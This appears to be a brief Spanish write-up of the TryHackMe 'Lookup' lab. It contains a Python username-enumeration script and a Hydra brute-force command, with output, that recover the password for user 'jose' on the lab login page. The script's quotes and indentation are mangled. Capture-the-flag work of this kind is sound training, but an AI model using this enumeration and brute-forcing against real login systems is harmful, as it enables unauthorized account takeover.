https://tryhackme.com/room/lookup


```
http://lookup.thm/
```


## Buscando credenciales de login

- hacemos intentos de login, para detectar nombres de usuario

#passwordbrutepython

```python
import requests 
 
# Define the target URL 
url = “http://lookup.thm/login.php" 
 
# Define the file path containing usernames 
file_path = “/usr/share/seclists/Usernames/Names/names.txt” 
 
# Read the file and process each line 
try: 
with open(file_path, “r”) as file: 
for line in file: 
username = line.strip() 
if not username: 
continue # Skip empty lines 
 
# Prepare the POST data 
data = { 
“username”: username, 
“password”: “password” # Fixed password for testing 
} 
 
# Send the POST request 
response = requests.post(url, data=data) 
 
# Check the response content 
if “Wrong password” in response.text: 
print(f”Username found: {username}”) 
elif “wrong username” in response.text: 
continue # Silent continuation for wrong usernames 
except FileNotFoundError: 
print(f”Error: The file {file_path} does not exist.”) 
except requests.RequestException as e: 
print(f”Error: An HTTP request error occurred: {e}”)
```

### Fuerza bruta a jose

```
┌──(kali㉿kali)-[~]
└─$ hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:user=jose&pass=^PASS^:F=Wrong password" -t 64 -f 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-10 12:56:04
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:user=jose&pass=^PASS^:F=Wrong password
[80][http-post-form] host: lookup.thm   login: jose   password: 123456789
[STATUS] attack finished for lookup.thm (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-10 12:56:06
                                                                                 
┌──(kali㉿kali)-[~]
└─$ 
```